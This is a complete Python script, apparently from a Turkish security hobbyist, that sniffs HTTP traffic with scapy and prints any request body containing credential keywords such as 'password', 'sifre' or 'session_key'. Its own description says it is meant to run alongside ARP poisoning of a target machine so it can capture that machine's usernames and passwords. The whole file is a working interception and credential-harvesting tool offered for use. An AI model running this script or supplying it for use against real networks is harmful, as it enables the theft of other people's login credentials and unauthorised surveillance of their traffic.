#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
from termcolor import colored
import sys
try:
	import scapy.all as scapy
except KeyboardInterrupt:
	print(colored("\n[-] CTRL+C basıldı.ARP tablosu sıfırlanıyor... Lütfen bekleyiniz...", "red"))
	print(colored("[-] Uygulamadan çıkış yapıldı!", "red"))
	sys.exit()
import scapy_http.http as http



class Sniffer():
	def __init__(self):
		self.about()
		self.script_desc()

	def arguman_al(self):
		parser = argparse.ArgumentParser(description=self.description,epilog=self.kullanim,prog=self.program,formatter_class=argparse.RawTextHelpFormatter)
		parser.add_argument("--interface",dest="interface",help=" Arayuz secimi")
		options=parser.parse_args()
		if not options.interface:
			parser.error('[-] Lütfen bir arayüz belirleyiniz,daha fazla bilgi için --help kullanın.')
		else:
			return options.interface


	def sniff(self,interface):
		scapy.sniff(iface=interface,store=False,prn=self.process_sniffed_packet)


	def get_url(self,paket):
		return paket[http.HTTPRequest].Host+paket[http.HTTPRequest].Path


	def get_login_info(self,paket):
		if paket.haslayer(scapy.Raw):
			try:
				load = (paket[scapy.Raw].load).decode("utf-8")
				keywords = ["username", "user", "pass", "password", "sifre", "ad", "login", "kullanici", "kullaniciadi","kullaniciAdi", "parola", "session_key", "session_password", "log", "pwd"]
				for keyword in keywords:
					if keyword in load:
						return load
			except UnicodeDecodeError:
				pass


	def process_sniffed_packet(self,paket):
		if paket.haslayer(http.HTTPRequest):
			url=self.get_url(paket)
			print("[+] HTTP Request >> "+url.decode("utf-8"))
			login_info=self.get_login_info(paket)
			if login_info:
				print("\n\n[+] Olası kullanıcı adı / Parola > "+str(login_info)+"\n\n")


	def script_desc(self):
		self.program = "packet_sniffer"
		self.kullanim ="""Kullanim: python packet_sniffer.py --interface ARAYUZ\nOrnek Kullanim: python packet_sniffer.py --interface eth0"""
		self.description = "Arp Spoofer ile hedef bilgisayar üzerinde ARP zehirlemesi yaparken ,Bu script ile aynı anda http isteklerini dinlemeye alarak olası kullanıcı adı / parola girişlerini görüntüler."


	def about(self):
		print(colored(" ____            _        _     ____        _  __  __           ", "green"))
		print(colored("|  _ \ __ _  ___| | _____| |_  / ___| _ __ (_)/ _|/ _| ___ _ __ ", "green"))
		print(colored("| |_) / _` |/ __| |/ / _ \ __| \___ \| '_ \| | |_| |_ / _ \ '__|", "green"))
		print(colored("|  __/ (_| | (__|   <  __/ |_   ___) | | | | |  _|  _|  __/ |   ", "green"))
		print(colored("|_|   \__,_|\___|_|\_\___|\__| |____/|_| |_|_|_| |_|  \___|_|   ", "green"))
		print(colored("# author  	:", "green") + "Mustafa Dalga")
		print(colored("# linkedin  	:", "green") + "https://www.linkedin.com/in/mustafadalga")
		print(colored("# github   	:", "green") + "https://github.com/mustafadalga")
		print(colored("# title     	:", "green") + "packet_sniffer.py")
		print(colored("# description   :", "green") + "Arp Spoofer ile hedef bilgisayar üzerinde ARP zehirlemesi yaparken ,Bu script ile aynı anda http isteklerini dinlemeye alarak olası kullanıcı adı / parola girişlerini görüntüler.")
		print(colored("# date          :", "green") + "22.02.2019")
		print(colored("# version       :", "green") + "1.0")
		print(colored("# python_version:", "green") + "3.7.2")
		print(colored("# ==============================================================================", "green"))


try:
	sniffer=Sniffer()
	sniffer.sniff(sniffer.arguman_al())
except KeyboardInterrupt:
	sys.exit()

